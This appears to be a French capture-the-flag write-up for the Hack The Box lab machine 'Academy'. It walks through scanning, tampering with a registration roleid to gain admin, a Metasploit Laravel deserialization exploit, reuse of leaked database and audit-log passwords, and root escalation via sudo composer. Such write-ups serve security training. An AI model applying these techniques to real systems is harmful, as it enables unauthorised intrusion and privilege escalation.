# Academy - Easy

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-20 11:26 EDT
Nmap scan report for 10.10.10.215
Host is up (0.061s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://academy.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.85 seconds
```

On rajoute le nom de domaine dans notre hosts et on lance un gobuster en tâche de fond. On va lancer un sqlmap sur les pages de login et register:

```bash
[11:32:17] [CRITICAL] all tested parameters do not appear to be injectable.
```

On créé un compte et on se connecte mais rien de particulier sur le site en tant qu’user normal

Résultats du gobuster:

```bash
/login.php            (Status: 200) [Size: 2627]
/register.php         (Status: 200) [Size: 3003]
/index.php            (Status: 200) [Size: 2117]
/admin.php            (Status: 200) [Size: 2633]
/config.php           (Status: 200) [Size: 0]   
/home.php             (Status: 302) [Size: 55034] [--> login.php]
/.htaccess            (Status: 403) [Size: 276]                  
/.                    (Status: 200) [Size: 2117]                 
/.html                (Status: 403) [Size: 276]                  
/.php                 (Status: 403) [Size: 276]                  
/.htpasswd            (Status: 403) [Size: 276]                  
/.htm                 (Status: 403) [Size: 276]                  
/.htpasswds           (Status: 403) [Size: 276]                  
/.htgroup             (Status: 403) [Size: 276]                  
/wp-forum.phps        (Status: 403) [Size: 276]                  
/.htaccess.bak        (Status: 403) [Size: 276]                  
/.htuser              (Status: 403) [Size: 276]                  
/.ht                  (Status: 403) [Size: 276]                  
/.htc                 (Status: 403) [Size: 276]                  
/.htacess             (Status: 403) [Size: 276]                  
/.htaccess.old        (Status: 403) [Size: 276]
```

On retente un SQL:

```bash
[11:37:38] [CRITICAL] all tested parameters do not appear to be injectable.
```

On lance une énumération des vhosts. Rien de particulier.

Lorsque l’on analyse la requête de register on trouve ceci:

```bash
uid=test&password=test&confirm=test&roleid=0
```

On va donc essayer de modifier le roleid et se connecter sur admin.php. Cette fois-ci on peut se connecter et on tombe sur un panel de choses à faire dont:

```bash
Fix issue with dev-staging-01.academy.htb
```

On rajoute donc à notre hosts. Lorsque l’on accède au site on tombe sur une erreur et le code associé à celui-ci. On trouve un mdp sql:

```bash
DB_HOST 	

"127.0.0.1"

DB_PORT 	

"3306"

DB_DATABASE 	

"homestead"

DB_USERNAME 	

"homestead"

DB_PASSWORD 	

"secret"
```

On apprend aussi que les fichiers sont ici:

/var/www/html/htb-academy-dev-01/public  et que l’admin est : admin@htb. On sait aussi que c’est Laravel qui est utilisé. D’après l’apparence de la page c’est la version 5.X qui est utilisée

[https://www.exploit-db.com/exploits/47129](https://www.exploit-db.com/exploits/47129)

On utilise metasploit:

```bash
exploit/unix/http/laravel_token_unserialize_exec
```

On est connecté en tant que!:

```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

On trouve ceci dans le .env du site academy (les creds précédents ne fonctionnent pas)

```bash
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=academy
DB_USERNAME=dev
DB_PASSWORD=mySup3rP4s5w0rd!!
```

Cepandant toujours impossible d’utilise mysql on essaye alors de su en tant que les différents users avec ce mdp:

```bash
drwxr-xr-x  8 root     root     4096 Aug 10  2020 .
drwxr-xr-x 20 root     root     4096 Feb 10  2021 ..
drwxr-xr-x  2 21y4d    21y4d    4096 Aug 10  2020 21y4d
drwxr-xr-x  2 ch4p     ch4p     4096 Aug 10  2020 ch4p
drwxr-xr-x  4 cry0l1t3 cry0l1t3 4096 Aug 12  2020 cry0l1t3
drwxr-xr-x  3 egre55   egre55   4096 Aug 10  2020 egre55
drwxr-xr-x  2 g0blin   g0blin   4096 Aug 10  2020 g0blin
drwxr-xr-x  5 mrb3n    mrb3n    4096 Aug 12  2020 mrb3n
```

ça fonctionne pour cry0 et on obtient le flag user

```bash
groups
cry0l1t3 adm
```

On lance linpeas:

```bash
1. 08/12/2020 02:28:10 83 0 ? 1 sh "su mrb3n",<nl>                                                                             
2. 08/12/2020 02:28:13 84 0 ? 1 su "mrb3n_Ac@d3my!",<nl>

╔══════════╣ Readable files belonging to root and readable by me but not world readable                                        
-rw-r----- 1 root adm 4726 Nov  5  2020 /var/log/apt/term.log.2.gz                                                             
-rw-r----- 1 root adm 2748 Sep 14  2020 /var/log/apt/term.log.3.gz                                                             
-rw-r----- 1 root adm 463 Feb  9  2021 /var/log/apt/term.log.1.gz                                                              
-rw-r----- 1 root adm 10682 Aug 12  2020 /var/log/apt/term.log.4.gz                                                            
-rw-r----- 1 root adm 0 Mar 20 09:25 /var/log/apt/term.log                                                                                                                                                                                                    
-r--r----- 1 root adm 8388720 Sep  4  2020 /var/log/audit/audit.log.2                                                          
-rw-r----- 1 root adm 120395 Mar 20 10:37 /var/log/audit/audit.log                                                             
-r--r----- 1 root adm 8388617 Aug 23  2020 /var/log/audit/audit.log.3                                                          
-r--r----- 1 root adm 8388813 Nov  9  2020 /var/log/audit/audit.log.1                                                          
-rw-r----- 1 root adm 275 Oct 21  2020 /var/log/apache2/error.log.5.gz                                                         
-rw-r----- 1 root adm 335 Sep 12  2020 /var/log/apache2/error.log.9.gz

╔══════════╣ CVEs Check                                                                                                        
Vulnerable to CVE-2021-4034                                                                                                    
                                                                                                                               
Vulnerable to CVE-2021-3560
```

On arrive donc à se log en tant qur mrb3n:

```bash
$ sudo -l
[sudo] password for mrb3n: 
Matching Defaults entries for mrb3n on academy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mrb3n may run the following commands on academy:
    (ALL) /usr/bin/composer
```

[https://gtfobins.github.io/gtfobins/composer/](https://gtfobins.github.io/gtfobins/composer/)

On obtient un shell root